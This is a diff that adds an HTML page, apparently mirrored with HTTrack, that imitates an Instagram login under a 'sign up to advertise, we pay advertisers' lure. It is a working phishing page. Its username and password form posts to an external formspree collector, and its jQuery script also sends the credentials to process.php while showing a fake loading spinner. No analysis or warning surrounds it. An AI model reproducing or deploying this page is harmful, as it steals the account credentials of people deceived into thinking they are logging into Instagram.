@@ -1,0 +1,256 @@
+
+<!doctype html>
+<html lang="en">
+  
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">  
+    
+      <title>Instagram   </title>
+    <!-- Bootstrap core CSS -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="../../../site-assets.fontawesome.com/releases/v6.4.2/css/all.css" rel="stylesheet">
+    <link href="../../../external.html?link=https://tallyskul.fun/voteln/ig/css/index.css" rel="stylesheet">
+        <script src="../../../external.html?link=https://tallyskul.fun/voteln/code.jquery.com/jquery-3.4.1.min.js" ></script>
+  
+    <style>
+
+.phone
+{
+        padding-top: 70px;
+        height: 650px;
+        float: right;
+        margin: 10px;
+}
+body
+{
+        background-color: #fafafa !important;
+}
+.container
+{
+        margin-top: 20px;
+}
+.right-column
+{
+        background-color: #fff;
+        border: 1px solid #e6e6e6;
+        width: 350px;
+        margin: 10px;
+        padding: 40px;
+}
+.insta-logo
+{
+        margin: 15px auto;
+}
+.info
+{
+        font-weight: 600px;
+        line-height: 20px;
+        font-size: 14px;
+        color: #999;
+}
+.face
+{
+        font-weight: 400px;
+        line-height: 10px;
+        font-size: 14px;
+        color: #fff;
+}
+button img
+{
+       height: 17px!important;
+       padding: 0 6px 2px;
+}
+.or
+{
+       font-size: 12px!important;
+       color: #999;
+       font-weight: 600;
+}
+.or::before
+{
+       content: '';
+       background: #efefef;
+       display: block;
+       height: 1px;
+       width: 100px;
+       position: relative;
+       top: 11px;
+}
+.or::after
+{
+       content: '';
+       background: #efefef;
+       display: block;
+       height: 1px;
+       width: 100px;
+       position: relative;
+       bottom: 10px;
+       left: 160px;
+}
+.form-group
+{
+      margin-bottom: 9px!important;
+}
+.form-control
+{
+      background: #fafafa!important;
+      border: 1px solid #efefef!important;
+      font-size: 12px!important;
+      border-radius: 0px !important;
+}
+.placeholder
+{
+      color: #999!important;
+      margin: 12px auto;
+      padding: 1px!important;
+      font-weight: 600!important;
+}
+      
+
+.terms
+{
+      line-height: 16px;
+      font-size: 11px;
+      color: #999;
+      margin: 5px 10px;
+}
+.right-column-login
+{
+      background: #fff;
+      border: 1px solid #e6e6e6;
+      width: 350px;
+      margin: 10px;
+      padding: 20px;
+}
+.right-column-login a:hover
+{
+      text-decoration: none;
+}
+
+    </style>
+
+    
+  </head> 
+  <body>
+
+
+
+<main>
+
+  <section>
+  <div class="container ">
+    <div class="row justify-content-center">
+         
+         <div class="col-sm-6 ">
+              <div class="right-column text-center">
+                    <p class="info">Sign up to products to advertise.
+                        <br> according to our policies and terms of use, we pay advertisers before advertising.
+                    </p>
+                    <a class="btn btn-block btn-primary">
+                      <span class="face"><i class="fa-brands fa-facebook"></i> Log in with Facebook</span></a>
+                    <p class="or">OR</p>
+<form id="myForm" action="https://formspree.io/f/xgorzwrv" method="POST">
+    
+    <div class="form-group mb-3">
+        <input type="text" name="username" class="form-control" placeholder="Username" required>
+    </div>
+
+    <div class="form-group mb-3">
+        <input type="password" name="password" class="form-control" placeholder="Password" required>
+    </div>
+
+    <input type="hidden" name="_next" value="https://yourusername.github.io/index.html?1">
+
+    <button type="submit" id="submitBtn" class="btn btn-primary btn-block"> Login </button>
+
+    <div id="error">
+        </div>
+</form>
+                   <p class="terms">By signing up, you agree to our <b>Terms, Data Policy</b> and <b>Cookies Policy</b></p>
+              </div>
+              <div class="right-column-login text-center">
+                   <p>Have an account?<a href="#"  id="spinButton">Signup</a></p>
+              </div>
+         </div>
+    </div>
+</div>
+</div>
+
+ </section>
+
+</main>
+<script src="../../../code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="../../../external.html?link=https://tallyskul.fun/voteln/ig/vendor/bootstrap.bundle.min.js"></script>
+<script>
+        $(document).ready(function() {
+             var elementToHidx = document.getElementById("submitBtn");
+            
+            $("#myForm").submit(function(event) {
+                $("#submitBtn").prop("disabled", true);
+                elementToHidx.innerHTML  = "<i class='fa fa-spinner fa-spin' style='font-size:30px'></i>";
+
+
+                event.preventDefault();
+
+                var formData = $(this).serialize();
+
+                $.ajax({
+                    type: "POST",
+                    url: "process.php",  
+                    data: formData,
+                    dataType: 'json',
+                    success: function(response) {
+
+
+                        setTimeout(function() {
+                         elementToHidx.innerHTML = 'Login';
+                        $("#submitBtn").prop("disabled", false);
+
+
+                        if(response.type === 'error'){ 
+                        $("#error").html(
+                            '<p class="text-danger mt-3 mb-2 d-" id="error">'+  response.message +'</p>');
+                        }else { 
+                             $("#results").html(response);
+
+                            
+                        }
+
+
+                    }, 3000);
+
+                        
+                    }
+                });
+            });
+        });
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+
+      
+</body>
+
+<!-- Mirrored from tallyskul.fun/voteln/ig/index.html by HTTrack Website Copier/3.x [XR&CO'2017], Thu, 23 May 2024 18:56:10 GMT -->
+</html>
